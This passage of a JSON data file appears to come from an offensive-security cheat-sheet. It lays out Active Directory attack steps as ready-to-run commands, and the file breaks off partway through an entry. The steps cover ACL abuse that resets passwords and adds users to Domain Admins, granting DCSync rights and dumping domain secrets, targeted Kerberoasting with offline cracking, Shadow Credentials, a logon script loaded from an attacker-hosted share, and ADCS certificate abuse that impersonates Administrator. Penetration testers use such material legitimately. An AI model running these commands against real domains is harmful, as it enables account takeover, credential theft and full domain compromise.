[
  {
    "category": "AD Object Permission Abuse",
    "title": "Abusing ForceChangePassword",
    "tags": [
      "Active_Directory",
      "BloodHound",
      "LDAP",
      "PowerShell",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Reset Password Without Current",
        "codes": [
          {
            "lang": "powershell",
            "code": "Set-DomainUserPassword -Identity <TargetUser> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)"
          },
          {
            "lang": "bash",
            "code": "rpcclient -U \"<Domain>/<User>%<Password>\" <DC> -c \"setuserinfo2 <TargetUser> 23 'NewPass123!'\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "AD Object Permission Abuse",
    "title": "Abusing GenericAll",
    "tags": [
      "Active_Directory",
      "BloodHound",
      "LDAP",
      "PowerShell",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "GenericAll on User",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Reset password\nSet-DomainUserPassword -Identity <TargetUser> -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)"
          },
          {
            "lang": "bash",
            "code": "net rpc password <TargetUser> 'NewPassword123!' -U <Domain>/<User>%<Password> -S <DC>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Can reset password, set SPN (Kerberoast), modify attributes.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "GenericAll on Group",
        "codes": [
          {
            "lang": "powershell",
            "code": "Add-DomainGroupMember -Identity \"Domain Admins\" -Members <AttackerUser>"
          },
          {
            "lang": "bash",
            "code": "net rpc group addmem \"Domain Admins\" <AttackerUser> -U <Domain>/<User>%<Password> -S <DC>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Can add self or others to group.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "GenericAll on Computer",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Configure RBCD\nSet-DomainObject -Identity <TargetComputer> -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Can configure RBCD, read LAPS password.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "AD Object Permission Abuse",
    "title": "Abusing WriteDACL",
    "tags": [
      "Active_Directory",
      "BloodHound",
      "LDAP",
      "PowerShell",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Grant Yourself GenericAll",
        "codes": [
          {
            "lang": "powershell",
            "code": "Add-DomainObjectAcl -TargetIdentity <TargetObject> -PrincipalIdentity <AttackerUser> -Rights All"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Grant DCSync Rights",
        "codes": [
          {
            "lang": "powershell",
            "code": "Add-DomainObjectAcl -TargetIdentity \"DC=domain,DC=local\" -PrincipalIdentity <AttackerUser> -Rights DCSync"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Impacket dacledit",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-dacledit -action write -rights FullControl -principal <AttackerUser> -target <TargetObject> <Domain>/<User>:<Password>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "AD Object Permission Abuse",
    "title": "Abusing WriteOwner",
    "tags": [
      "Active_Directory",
      "BloodHound",
      "LDAP",
      "PowerShell",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Take Ownership",
        "codes": [
          {
            "lang": "powershell",
            "code": "Set-DomainObjectOwner -Identity <TargetObject> -OwnerIdentity <AttackerUser>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Then Grant Yourself Rights",
        "codes": [
          {
            "lang": "powershell",
            "code": "Add-DomainObjectAcl -TargetIdentity <TargetObject> -PrincipalIdentity <AttackerUser> -Rights All"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Access Token Attacks",
    "title": "Access Token Theory",
    "tags": [
      "Credential_Access",
      "Privilege_Escalation",
      "Token_Manipulation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Token Types",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "- **Primary Token** - Assigned to process, represents process owner\n- **Impersonation Token** - Thread-level, allows acting as different user"
          }
        ]
      },
      {
        "title": "Impersonation Levels",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "- **Anonymous** - Server cannot identify client\n- **Identification** - Server can identify but not impersonate\n- **Impersonation** - Server can impersonate locally\n- **Delegation** - Server can impersonate across network"
          }
        ]
      },
      {
        "title": "Required Privileges for Token Manipulation",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Key privileges:\n- **SeImpersonatePrivilege** - Impersonate tokens (service accounts have this)\n- **SeAssignPrimaryTokenPrivilege** - Assign tokens to processes\n- **SeDebugPrivilege** - Access other processes (for token theft)",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Check Current Privileges",
        "codes": [
          {
            "lang": "bash",
            "code": "whoami /priv"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "Microsoft Access Tokens",
        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Access tokens represent security context of process/thread. Contain user SID, group SIDs, privileges. Can be stolen/impersonated for privilege escalation.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "ACL Abuse",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "GenericAll on User",
        "substeps": [
          {
            "title": "Targeted Kerberoasting (Preferred)",
            "codes": [
              {
                "lang": "bash",
                "code": "bloodyAD -d <Domain> -u <User> -p <Pass> --host <DC_IP> set object <TargetUser> servicePrincipalName -v \"fake/spn\""
              },
              {
                "lang": "bash",
                "code": "nxc ldap <DC_IP> -u <User> -p <Pass> --kerberoasting kerberoast.txt"
              },
              {
                "lang": "bash",
                "code": "hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r best64.rule"
              },
              {
                "lang": "powershell",
                "code": "Set-DomainObject -Identity <TargetUser> -SET @{serviceprincipalname='fake/spn'}"
              },
              {
                "lang": "powershell",
                "code": "Rubeus.exe kerberoast /user:<TargetUser> /nowrap"
              },
              {
                "lang": "powershell",
                "code": "Set-DomainObject -Identity <TargetUser> -Clear serviceprincipalname"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Set an SPN on the target, request a ticket, crack offline. User doesn't notice."
              }
            ]
          },
          {
            "title": "Shadow Credentials",
            "codes": [
              {
                "lang": "bash",
                "code": "python3 pywhisker.py -d <Domain> -u <User> -p <Pass> --target <TargetUser> --action add --dc-ip <DC_IP>"
              },
              {
                "lang": "bash",
                "code": "python3 gettgtpkinit.py -cert-pfx <TargetUser>.pfx -pfx-pass <PfxPassword> <Domain>/<TargetUser> <TargetUser>.ccache"
              },
              {
                "lang": "bash",
                "code": "python3 getnthash.py -key <AS_REP_Key> <Domain>/<TargetUser>"
              },
              {
                "lang": "powershell",
                "code": "Whisker.exe add /target:<TargetUser>"
              },
              {
                "lang": "bash",
                "code": "python3 pywhisker.py -d <Domain> -u <User> -p <Pass> --target <TargetUser> --action remove --device-id <DeviceID>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Add certificate-based credential. Stealthy, doesn't change password. Requires ADCS or Win2016+ DC."
              }
            ]
          },
          {
            "title": "Password Reset (Loud)",
            "codes": [
              {
                "lang": "bash",
                "code": "bloodyAD -d <Domain> -u <User> -p <Pass> --host <DC_IP> set password <TargetUser> 'NewPassword123!'"
              },
              {
                "lang": "bash",
                "code": "net rpc password <TargetUser> 'NewPassword123!' -U \"<Domain>/<User>%<Pass>\" -S <DC_IP>"
              },
              {
                "lang": "powershell",
                "code": "$cred = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force\nSet-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred"
              },
              {
                "lang": "bash",
                "code": "net user <TargetUser> NewPassword123! /domain"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Reset password directly. Fast but user will know."
              }
            ]
          },
          {
            "title": "GenericAll on User Troubleshooting",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "**SPN already set** - Target has existing SPN - Kerberoast directly, no need to set\n**Shadow cred fails** - No ADCS or old DC - Use Kerberoast or password reset\n**Password reset fails** - Password policy - Use complex password meeting requirements\n**pyWhisker errors** - Missing dependencies - `pip install pywhisker` with all deps"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "GenericAll on a user object = full control. You can reset their password, Kerberoast them, or add Shadow Credentials.\n**Attack options:** Targeted Kerberoast (quiet), Shadow Credentials (quiet, requires ADCS/Win2016+), Password Reset (loud).\n**Preferred order:** Targeted Kerberoast -> Shadow Credentials -> Password Reset"
          }
        ]
      },
      {
        "title": "GenericAll on Group",
        "codes": [
          {
            "lang": "bash",
            "code": "net rpc group addmem \"Domain Admins\" <User> -U \"<Domain>/<User>%<Pass>\" -S <DC_IP>"
          },
          {
            "lang": "powershell",
            "code": "Add-DomainGroupMember -Identity \"Domain Admins\" -Members <User>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "GenericWrite on User",
        "substeps": [
          {
            "title": "Targeted Kerberoasting with GenericWrite",
            "codes": [
              {
                "lang": "bash",
                "code": "bloodyAD -d <Domain> -u <User> -p <Pass> --host <DC_IP> set object <TargetUser> servicePrincipalName -v \"fake/spn\""
              },
              {
                "lang": "bash",
                "code": "impacket-GetUserSPNs -request -dc-ip <DC_IP> <Domain>/<User>:<Pass> -outputfile roast.txt"
              },
              {
                "lang": "bash",
                "code": "bloodyAD -d <Domain> -u <User> -p <Pass> --host <DC_IP> set object <TargetUser> servicePrincipalName"
              },
              {
                "lang": "bash",
                "code": "hashcat -m 13100 roast.txt /usr/share/wordlists/rockyou.txt -r best64.rule"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Logon Script Attack",
            "codes": [
              {
                "lang": "bash",
                "code": "bloodyAD -d <Domain> -u <User> -p <Pass> --host <DC_IP> set object <TargetUser> scriptPath -v '\\\\<AttackerIP>\\share\\script.ps1'"
              },
              {
                "lang": "powershell",
                "code": "Set-DomainObject -Identity <TargetUser> -SET @{scriptpath='\\\\<AttackerIP>\\share\\script.ps1'}"
              },
              {
                "lang": "bash",
                "code": "impacket-smbserver share . -smb2support"
              },
              {
                "lang": "powershell",
                "code": "Set-DomainObject -Identity <TargetUser> -Clear scriptpath"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Set a malicious logon script. Executes when target logs in."
              }
            ]
          },
          {
            "title": "Enumerate GenericWrite Permissions",
            "codes": [
              {
                "lang": "powershell",
                "code": "Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -eq \"<YourUser>\" -and $_.ActiveDirectoryRights -match \"GenericWrite\"}"
              },
              {
                "lang": "bash",
                "code": "bloodyAD -d <Domain> -u <User> -p <Pass> --host <DC_IP> get object <TargetUser> --attr nTSecurityDescriptor --resolve-sd"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "What You CAN'T Do with GenericWrite",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "**Reset password** - Requires GenericAll or ForceChangePassword\n**Delete object** - Requires GenericAll or DeleteChild\n**Modify DACL** - Requires WriteDacl\n**Take ownership** - Requires WriteOwner"
              }
            ]
          },
          {
            "title": "GenericWrite Troubleshooting",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "**insufficientAccessRights** - Don't have GenericWrite - Verify edge direction in BloodHound\n**SPN already set** - Target has existing SPN - Kerberoast directly, no need to set\n**Shadow cred fails** - No ADCS or DC < 2016 - Use Kerberoast or logon script\n**Logon script no callback** - User hasn't logged in - Wait, or try different attack"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "GenericWrite on a user object lets you modify attributes. You can Kerberoast them, add Shadow Credentials, or set a logon script.\n**Key difference from GenericAll:** Cannot reset password directly.\n**Attack options:** Targeted Kerberoast (quiet), Shadow Credentials (quiet), Logon Script (medium stealth).\n**Preferred order:** Targeted Kerberoast -> Shadow Credentials -> Logon Script"
          }
        ]
      },
      {
        "title": "WriteDACL - Grant GenericAll",
        "codes": [
          {
            "lang": "powershell",
            "code": "Add-DomainObjectAcl -TargetIdentity <TargetUser> -PrincipalIdentity <User> -Rights All"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "WriteDACL - Grant DCSync Rights",
        "codes": [
          {
            "lang": "bash",
            "code": "dacledit.py -action write -rights DCSync -principal <User> -target-dn \"DC=<Domain>,DC=local\" <Domain>/<User>:<Pass>\nimpacket-secretsdump -just-dc <Domain>/<User>:<Pass>@<DC_IP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "WriteOwner - Take Ownership",
        "codes": [
          {
            "lang": "powershell",
            "code": "Set-DomainObjectOwner -Identity <Target> -OwnerIdentity <User>\nAdd-DomainObjectAcl -TargetIdentity <Target> -PrincipalIdentity <User> -Rights All"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "ForceChangePassword",
        "codes": [
          {
            "lang": "powershell",
            "code": "Set-DomainUserPassword -Identity <TargetUser> -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Use BloodHound to identify ACL misconfigurations."
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "Active Directory and Kerberos Attacks",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Comprehensive AD attack methodology including Kerberos exploitation, credential dumping, lateral movement, and privilege escalation.\n**Core Tools:** Impacket, Mimikatz, Rubeus, Kerbrute, NetExec, BloodHound, Certipy, hashcat"
      }
    ]
  },
  {
    "category": "AD Forest Theory",
    "title": "Active Directory Trust Theory",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Windows"
    ],
    "steps": [
      {
        "title": "Trust Types",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "- **Parent-Child** - Automatic two-way transitive trust within forest\n- **Tree-Root** - Trust between tree roots in same forest\n- **Forest** - Trust between different forests\n- **External** - Trust to specific domain in another forest\n- **Shortcut** - Optimization trust between domains in same forest"
          }
        ]
      },
      {
        "title": "Trust Directions",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "- **One-way** - Users in trusted domain can access trusting domain\n- **Two-way** - Users in both domains can access each other\n- **Transitive** - Trust extends through chain of domains\n- **Non-transitive** - Trust limited to two specific domains"
          }
        ]
      },
      {
        "title": "SID Filtering",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Security mechanism that filters out SIDs from other domains. Prevents privilege escalation via SID history.",
            "variant": "important"
          }
        ]
      },
      {
        "title": "When SID Filtering is Disabled",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "SID Filtering is disabled in these scenarios:\n- Intra-forest trusts (disabled by default)\n- When explicitly disabled on forest trust\n- Enables SID History attacks",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Enumerate Trusts",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ADTrust -Filter *"
          },
          {
            "lang": "powershell",
            "code": "Get-DomainTrust"
          },
          {
            "lang": "bash",
            "code": "nltest /domain_trusts"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Enumerate Foreign Forest Trusts",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-DomainTrust -Domain <TrustedForest>"
          },
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<DC-IP> -D \"<User>@<Domain>\" -w \"<Password>\" -b \"CN=System,DC=<Domain>,DC=<TLD>\" \"(objectClass=trustedDomain)\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "Microsoft AD Trusts",
        "url": "https://learn.microsoft.com/en-us/entra/identity/domain-services/concepts-forest-trust"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Forests are security boundaries in AD. Trusts allow authentication across domains/forests.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Active Directory Username Generator",
    "title": "Active Directory Username Generator",
    "tags": [
      "Active_Directory",
      "Windows"
    ],
    "steps": [
      {
        "title": "Generate Usernames",
        "codes": [
          {
            "lang": "bash",
            "code": "python3 username-generate.py -u /root/machines/<Machine>/<TargetIP>/usernames -o /root/machines/<Machine>/<TargetIP>/generated_usernames"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "AD-Username-Generator GitHub",
        "url": "https://github.com/mohinparamasivam/AD-Username-Generator"
      }
    ],
    "foundational": true
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "AD Initial Setup",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "Environment Variables",
        "codes": [
          {
            "lang": "bash",
            "code": "export DC_IP=<DC_IP>\nexport DOMAIN=<Domain>\nexport USER=<User>\nexport PASS='<Password>'\nexport TARGET=<TargetIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "DNS Configuration",
        "codes": [
          {
            "lang": "bash",
            "code": "echo \"nameserver $DC_IP\" | sudo tee /etc/resolv.conf"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Set environment variables and configure DNS for AD attacks."
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "AD Native Enumeration",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "List Domain Users",
        "codes": [
          {
            "lang": "bash",
            "code": "net user /domain"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Get Domain User Details",
        "codes": [
          {
            "lang": "bash",
            "code": "net user <Username> /domain"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "List Domain Groups",
        "codes": [
          {
            "lang": "bash",
            "code": "net group /domain"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "List Group Members",
        "codes": [
          {
            "lang": "bash",
            "code": "net group \"<GroupName>\" /domain\nnet group \"Domain Admins\" /domain"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Add User to Domain Group",
        "codes": [
          {
            "lang": "bash",
            "code": "net group \"<GroupName>\" <Username> /add /domain"
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Requires appropriate permissions (Domain Admin or delegated)."
          }
        ]
      },
      {
        "title": "Bypass Execution Policy",
        "codes": [
          {
            "lang": "powershell",
            "code": "powershell -ExecutionPolicy Bypass"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "List SPNs for Account",
        "codes": [
          {
            "lang": "bash",
            "code": "setspn -L <AccountName>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Find service accounts for Kerberoasting."
          }
        ]
      },
      {
        "title": "List Group Members - PowerShell",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ADGroupMember -Identity \"Domain Admins\" | select name"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Requires AD PowerShell module (RSAT)."
          }
        ]
      },
      {
        "title": "Browse SYSVOL Share",
        "codes": [
          {
            "lang": "powershell",
            "code": "ls \\\\<Domain>\\SYSVOL\\<Domain>\\Policies\nls \\\\<Domain>\\SYSVOL\\<Domain>\\scripts"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "SYSVOL contains Group Policy scripts and settings. May contain credentials."
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Built-in Windows tools for Active Directory enumeration. No external tools required."
      }
    ]
  },
  {
    "category": "AD Object Permission Abuse",
    "title": "AD Object Permission Theory",
    "tags": [
      "Active_Directory",
      "BloodHound",
      "LDAP",
      "PowerShell",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Dangerous Permissions",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "High-risk permissions to look for:\n- **GenericAll** - Full control over object\n- **GenericWrite** - Write all properties\n- **WriteDACL** - Modify object's ACL\n- **WriteOwner** - Change object owner\n- **ForceChangePassword** - Reset password without knowing current\n- **AddMember** - Add members to group",
            "variant": "danger"
          }
        ]
      },
      {
        "title": "Enumerate ACLs",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-DomainObjectAcl -Identity <ObjectName> -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match \"GenericAll|WriteDacl|WriteOwner\" }"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Find Interesting ACLs",
        "codes": [
          {
            "lang": "powershell",
            "code": "Find-InterestingDomainAcl -ResolveGUIDs"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "BloodHound ACL Analysis",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Import data and query for ACL-based attack paths using **BloodHound**.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "SpecterOps - ACL Attacks",
        "url": "https://specterops.io/wp-content/uploads/sites/3/2022/06/an_ace_up_the_sleeve.pdf"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "AD objects have Access Control Lists (ACLs) defining who can do what. Misconfigured ACLs enable privilege escalation.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "ADCS Attacks",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "Setup Certipy",
        "codes": [
          {
            "lang": "bash",
            "code": "cd /opt/Certipy\nsource Certipy-venv/bin/activate"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find Vulnerable Templates",
        "codes": [
          {
            "lang": "bash",
            "code": "certipy find -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -vulnerable"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find All AD CS Info",
        "codes": [
          {
            "lang": "bash",
            "code": "certipy find -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Output as Text",
        "codes": [
          {
            "lang": "bash",
            "code": "certipy find -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -text -stdout"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Easier to grep for specific vulnerabilities."
          }
        ]
      },
      {
        "title": "ESC1 - Template Misconfiguration (SAN)",
        "codes": [
          {
            "lang": "bash",
            "code": "certipy req -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -ca '<CA_Name>' -template '<Template>' -upn Administrator@<Domain>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Template allows requester to specify Subject Alternative Name. Request cert as anyone."
          }
        ]
      },
      {
        "title": "ESC4 - Template ACL Abuse",
        "substeps": [
          {
            "title": "Overwrite Template",
            "codes": [
              {
                "lang": "bash",
                "code": "certipy template -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -template '<Template>' -save-old"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Request Cert Using Modified Template",
            "codes": [
              {
                "lang": "bash",
                "code": "certipy req -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -ca '<CA_Name>' -template '<Template>' -upn Administrator@<Domain>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Restore Original Template",
            "codes": [
              {
                "lang": "bash",
                "code": "certipy template -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -template '<Template>' -configuration <Template>.json"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "You have write access to a template. Modify it to be vulnerable, then exploit."
          }
        ]
      },
      {
        "title": "ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2",
        "substeps": [
          {
            "title": "Check if Flag is Set",
            "codes": [
              {
                "lang": "bash",
                "code": "certipy find -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -vulnerable"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Look for EDITF_ATTRIBUTESUBJECTALTNAME2 in enumeration output."
              }
            ]
          },
          {
            "title": "Exploit Using Any Enrollable Template",
            "codes": [
              {
                "lang": "bash",
                "code": "certipy req -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -ca '<CA_Name>' -template User -upn Administrator@<Domain>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "CA has flag allowing SAN in any request. Any template becomes ESC1."
          }
        ]
      },
      {
        "title": "ESC7 - Vulnerable CA ACLs",
        "substeps": [
          {
            "title": "Add Yourself as Officer",
            "codes": [
              {
                "lang": "bash",
                "code": "certipy ca -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -ca '<CA_Name>' -add-officer '<User>'"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Requires ManageCA permission."
              }
            ]
          },
          {
            "title": "Enable SubCA Template",
            "codes": [
              {
                "lang": "bash",
                "code": "certipy ca -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -ca '<CA_Name>' -enable-template SubCA"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Request Cert",
            "codes": [
              {
                "lang": "bash",
                "code": "certipy req -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -ca '<CA_Name>' -template SubCA -upn Administrator@<Domain>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Will fail but saves request ID for later."
              }
            ]
          },
          {
            "title": "Issue the Failed Request",
            "codes": [
              {
                "lang": "bash",
                "code": "certipy ca -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -ca '<CA_Name>' -issue-request <RequestID>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Requires ManageCertificates or officer permission."
              }
            ]
          },
          {
            "title": "Retrieve the Issued Cert",
            "codes": [
              {
                "lang": "bash",
